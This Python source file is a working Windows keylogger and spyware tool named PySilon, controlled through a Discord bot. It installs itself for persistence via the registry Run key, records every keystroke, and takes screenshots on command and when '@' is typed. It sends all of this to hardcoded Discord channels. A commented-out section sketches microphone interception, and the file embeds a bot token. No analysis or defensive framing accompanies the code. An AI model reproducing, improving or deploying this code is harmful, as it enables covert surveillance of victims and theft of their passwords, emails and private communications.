import discord
from pynput.keyboard import Key, Listener
from shutil import copy2
import os
import sys
from getpass import getuser
import asyncio
import sounddevice
from scipy.io.wavfile import write
import winreg
import pyautogui
from resources.misc import *

client = discord.Client(intents=discord.Intents.all())
ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
text_buffor, force_to_send = '', False
messages_to_send, files_to_send, embeds_to_send = [], [], []

bot_token = 'NzQ2ODMyMjU1OTE3NDkwMTg2.X0GDvQ.6NO59zJzo9w37fKC3z8CxboE9Sk'   # Paste here BOT-token
software_registry_name = 'PySilon'   # -------------------------------------------- Software name shown in registry
software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name

channel_ids = {
    'main': 831567586344697868,   # Paste here main channel ID for general output
    'voice': 851570974867849257   # Paste here voice channel ID for realtime microphone intercepting
}

if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
    try: os.mkdir('C:\\Users\\' + getuser() + '\\' + software_directory_name)
    except: pass
    copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
    winreg.SetValueEx(registry_key, software_registry_name, 0, winreg.REG_SZ, 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    winreg.CloseKey(registry_key)

@client.event
async def on_ready():
    global force_to_send, messages_to_send, files_to_send, embeds_to_send
    await client.get_channel(channel_ids['main']).send('```[' + current_time() + '] New PC session```')
    while True:
        if len(messages_to_send) > 0:
            for message in messages_to_send:
                await client.get_channel(message[0]).send(message[1])
                await asyncio.sleep(0.1)
            messages_to_send = []
        if len(files_to_send) > 0:
            for file in files_to_send:
                await client.get_channel(file[0]).send(file[1], file=discord.File(file[2], filename=file[2]))
                await asyncio.sleep(0.1)
                if file[3]:
                    os.system('del ' + file[2])
            messages_to_send = []
        if len(embeds_to_send) > 0:
            for embedd in embeds_to_send:
                await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1]).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
                await asyncio.sleep(0.1)
            embeds_to_send = []
        await asyncio.sleep(1)

@client.event
async def on_message(message):
    global channel_ids
    if message.content == '.ss':
        pyautogui.screenshot().save('ss.png')
        await message.channel.send(embed=discord.Embed(title=current_time()).set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
        os.system('del ss.png')
    '''
    elif message.content == '.join':
        vc = await client.get_channel(channel_ids['voice']).connect()

        audio_source = discord.FFmpegPCMAudio(executable="ffmpeg-master-latest-win64-gpl\\bin\\ffmpeg.exe", source='1.wav')
        #record_voice = sounddevice.rec(int(10 * 16000), samplerate=16000, channels=1)
        #sounddevice.wait()
        #write('1.wav', 16000, record_voice)

        vc.play(audio_source, after=None)
    '''

def on_press(key):
    global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
    processed_key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key
    if processed_key in ctrl_codes.keys():
        processed_key = ' `' + ctrl_codes[processed_key] + '`'
    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
        match processed_key:
            case Key.space: processed_key = ' '
            case Key.shift: processed_key = ' *`SHIFT`*'
            case Key.enter: processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
            case Key.print_screen|'@':
                pyautogui.screenshot().save('ss.png')
                embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == Key.print_screen else ' `[Email typing]`'), 'ss.png'])

        text_buffor += str(processed_key)
        if len(text_buffor) > 1975:
            messages_to_send.append([channel_ids['main'], text_buffor])
            text_buffor = ''

with Listener(on_press=on_press) as listener:
    client.run(bot_token)
    listener.join()
